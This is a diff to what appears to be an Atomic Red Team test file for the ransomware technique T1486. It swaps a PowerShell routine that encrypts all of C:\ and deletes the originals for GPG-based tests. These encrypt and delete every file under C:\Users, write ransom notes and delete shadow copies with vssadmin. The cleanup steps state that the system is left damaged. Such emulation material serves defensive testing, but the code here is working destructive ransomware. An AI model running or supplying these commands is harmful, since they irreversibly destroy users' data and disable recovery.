@@ -1,46 +1,132 @@
+---
 attack_technique: T1486
 display_name: Data Encrypted for Impact
 atomic_tests:
-- name: Encrypt and Delete Files on C Drive
-  description: Simulates a ransomware attack by encrypting all files on C:\ and deleting originals.
-  supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    command: |
-      $targetDirectory = "C:\\"
-      $key = "MySecretEncryptionKey123" # Clé de chiffrement (peut être modifiée)
+  - name: Encrypt Files Using GPG4Win (Ransomware Simulation)
+    auto_generated_guid: 4541e2c2-33c8-44b1-be79-9161440f1718
+    description: >
+      Uses GPG4Win to encrypt files recursively in critical directories
+      (e.g., C:\Users) and deletes originals.
+    supported_platforms:
+      - windows
+    input_arguments:
+      GPG_Exe_Location:
+        description: Path of the GPG program
+        type: path
+        default: C:\Program Files (x86)\GnuPG\bin\gpg.exe
+      Target_Directory:
+        description: Directory to encrypt files
+        type: path
+        default: C:\Users
+      Passphrase:
+        description: Passphrase for encryption
+        type: string
+        default: MySecretKey123
+    dependencies:
+      - description: >
+          GPG must exist at (#{GPG_Exe_Location}). If -GetPrereqs fails, try
+          to install GPG4WIN manually at
+          'https://www.gpg4win.org/download.html'. Once done, run -CheckPrereqs
+          to confirm that it works.
+        prereq_command: |
+          if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}
+        get_prereq_command: >
+          New-Item -Type Directory
+          "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force
+          | Out-Null
 
-      function Encrypt-File {
-          param (
-              [string]$filePath,
-              [string]$key
-          )
-          try {
-              # Lire le contenu du fichier
-              $fileContent = Get-Content -Path $filePath -Raw -Encoding Byte
+          Invoke-WebRequest "https://files.gpg4win.org/gpg4win-4.1.0.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe"
 
-              # Configurer l'algorithme de chiffrement AES
-              $aes = New-Object System.Security.Cryptography.AesManaged
-              $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
-              $aes.IV = New-Object Byte[]($aes.BlockSize / 8) # IV vide pour simplicité
-              $encryptor = $aes.CreateEncryptor()
+          cmd /c "PathToAtomicsFolder\..\ExternalPayloads\gpginstall.exe" /S
+    executor:
+      name: powershell
+      elevation_required: true
+      command: >
+        $gpgPath = "#{GPG_Exe_Location}"
 
-              # Chiffrer les données
-              $encryptedData = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
+        $targetDir = "#{Target_Directory}"
 
-              # Écrire les données chiffrées dans un nouveau fichier
-              Set-Content -Path ($filePath + ".encrypted") -Value $encryptedData -Encoding Byte
+        $passphrase = "#{Passphrase}"
 
-              # Supprimer le fichier original
-              Remove-Item -Path $filePath -Force
-              Write-Host "Fichier chiffré et supprimé : $filePath"
-          } catch {
-              Write-Host "Erreur lors du chiffrement de $filePath : $_"
-          }
-      }
 
-      # Parcourir tous les fichiers dans le répertoire cible
-      Get-ChildItem -Path $targetDirectory -Recurse -File | ForEach-Object {
-          Encrypt-File -filePath $_.FullName -key $key
-      }
+        # Recursively encrypt all files in the target directory
+
+        Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
+            $filePath = $_.FullName
+            $encryptedFilePath = $filePath + ".gpg"
+            Start-Process -FilePath $gpgPath -ArgumentList "--batch --yes --passphrase '$passphrase' -c `"$filePath`"" -NoNewWindow -Wait
+            Remove-Item -Path $filePath -Force  # Delete the original file
+            Write-Host "Encrypted and deleted: $filePath"
+        }
+
+
+        # Create a ransom note
+
+        $ransomNote = @"
+
+        YOUR FILES HAVE BEEN ENCRYPTED!
+
+        To decrypt your files, contact us at fake@ransomware.com
+
+        and provide the passphrase: $passphrase.
+
+        "@
+
+        Set-Content -Path "$targetDir\READ_ME.txt" -Value $ransomNote
+
+        Write-Host "Ransom note created at $targetDir\READ_ME.txt"
+
+
+        # Delete shadow copies to inhibit recovery
+
+        vssadmin delete shadows /all /quiet
+
+        Write-Host "Shadow copies deleted."
+      cleanup_command: |
+        # No cleanup command (leave files encrypted and system damaged)
+  - name: Akira Ransomware Drop Files with .akira Extension and Ransom Note
+    auto_generated_guid: ab3f793f-2dcc-4da5-9c71-34988307263f
+    description: >
+      Simulates Akira ransomware by dropping encrypted files with .akira
+      extension and creating a ransom note.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      elevation_required: true
+      command: >
+        # Generate 100 encrypted files with random content
+
+        1..100 | ForEach-Object {
+            $out = New-Object Byte[] 1MB
+            (New-Object Random).NextBytes($out)
+            [IO.File]::WriteAllBytes("C:\test.$_.akira", $out)
+        }
+
+        Write-Host "Generated 100 encrypted files with .akira extension."
+
+
+        # Create a ransom note
+
+        $ransomNote = @"
+
+        YOUR FILES HAVE BEEN ENCRYPTED!
+
+        To decrypt your files, contact us at fake@ransomware.com
+
+        and provide the decryption key located in secret.key.
+
+        "@
+
+        Set-Content -Path "$env:UserProfile\Desktop\akira_readme.txt" -Value $ransomNote
+
+        Write-Host "Ransom note created at $env:UserProfile\Desktop\akira_readme.txt"
+
+
+        # Delete shadow copies to inhibit recovery
+
+        vssadmin delete shadows /all /quiet
+
+        Write-Host "Shadow copies deleted."
+      cleanup_command: |
+        # No cleanup command (leave files encrypted and system damaged)
